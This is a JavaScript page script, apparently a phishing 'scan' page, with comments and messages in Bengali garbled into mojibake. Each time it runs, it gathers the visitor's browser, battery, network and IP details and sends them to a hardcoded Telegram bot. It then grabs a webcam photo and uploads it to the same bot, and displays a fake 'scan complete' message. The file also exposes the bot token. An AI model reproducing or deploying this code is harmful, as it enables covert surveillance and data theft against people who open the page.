const BOT_TOKEN = "7249136904:AAGFPmdS5CnextPMpNlUPv0qeSuVHBaUF-w"; // ‡¶ü‡ßã‡¶ï‡ßá‡¶® ‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡ßã
const CHAT_ID = "8174575316"; // ‡¶ö‡ßç‡¶Ø‡¶æ‡¶ü ‡¶Ü‡¶á‡¶°‡¶ø ‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡ßã

// ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá ‡¶°‡¶æ‡¶ü‡¶æ ‡¶∏‡ßá‡¶®‡ßç‡¶° ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
async function sendData(data, isPhoto = false) {
  try {
    if (isPhoto) {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', data, 'photo.jpg');
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    } else {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(data)}`);
    }
  } catch (error) {
    console.error("Error:", error);
  }
}

// ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶á‡¶®‡¶´‡ßã ‡¶∏‡¶Ç‡¶ó‡ßç‡¶∞‡¶π
async function collectDeviceInfo() {
  let info = "üì± *‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶á‡¶®‡¶´‡ßã* üì±\n\n";
  
  // ‡¶¨‡ßá‡¶∏‡¶ø‡¶ï ‡¶á‡¶®‡¶´‡ßã
  info += `üïí ‡¶∏‡¶Æ‡ßü: ${new Date().toLocaleString()}\n`;
  info += `üåê ‡¶¨‡ßç‡¶∞‡¶æ‡¶â‡¶ú‡¶æ‡¶∞: ${navigator.userAgent}\n`;
  
  // ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶∞‡¶ø ‡¶∏‡ßç‡¶ü‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶∏ (‡¶Æ‡ßã‡¶¨‡¶æ‡¶á‡¶≤)
  if ('getBattery' in navigator) {
    const battery = await navigator.getBattery();
    info += `üîã ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶∞‡¶ø: ${Math.round(battery.level * 100)}% (${battery.charging ? "‡¶ö‡¶æ‡¶∞‡ßç‡¶ú ‡¶π‡¶ö‡ßç‡¶õ‡ßá" : "‡¶ö‡¶æ‡¶∞‡ßç‡¶ú ‡¶π‡¶ö‡ßç‡¶õ‡ßá ‡¶®‡¶æ"})\n`;
  }
  
  // ‡¶®‡ßá‡¶ü‡¶ì‡ßü‡¶æ‡¶∞‡ßç‡¶ï ‡¶á‡¶®‡¶´‡ßã
  if (navigator.connection) {
    info += `üì∂ ‡¶®‡ßá‡¶ü‡¶ì‡ßü‡¶æ‡¶∞‡ßç‡¶ï: ${navigator.connection.effectiveType}\n`;
  }
  
  // ‡¶Ü‡¶á‡¶™‡¶ø ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶°‡ßç‡¶∞‡ßá‡¶∏
  try {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    info += `üñ•Ô∏è ‡¶Ü‡¶á‡¶™‡¶ø: ${ipData.ip}\n`;
  } catch {
    info += `üñ•Ô∏è ‡¶Ü‡¶á‡¶™‡¶ø: ‡¶™‡¶æ‡¶ì‡ßü‡¶æ ‡¶Ø‡¶æ‡ßü‡¶®‡¶ø\n`;
  }
  
  return info;
}

// ‡¶Æ‡ßá‡¶á‡¶® ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
async function init() {
  // 1. ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶á‡¶®‡¶´‡ßã ‡¶∏‡ßá‡¶®‡ßç‡¶°
  const deviceInfo = await collectDeviceInfo();
  await sendData(deviceInfo);
  
  // 2. ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶è‡¶ï‡ßç‡¶∏‡ßá‡¶∏ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();
    
    // 3. ‡¶´‡¶ü‡ßã ‡¶∏‡ßá‡¶®‡ßç‡¶°
    setTimeout(async () => {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      canvas.toBlob(async (blob) => {
        await sendData(blob, true);
        document.getElementById('statusText').textContent = "‡¶∏‡ßç‡¶ï‡ßç‡¶Ø‡¶æ‡¶® ‡¶∏‡¶Æ‡ßç‡¶™‡¶®‡ßç‡¶®!";
      }, 'image/jpeg', 0.8);
    }, 3000);
    
  } catch (error) {
    await sendData("‚ö†Ô∏è ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶è‡¶ï‡ßç‡¶∏‡ßá‡¶∏ ‡¶¶‡ßá‡ßü‡¶®‡¶ø!");
  }
}

// ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶ï‡¶∞‡ßã
init();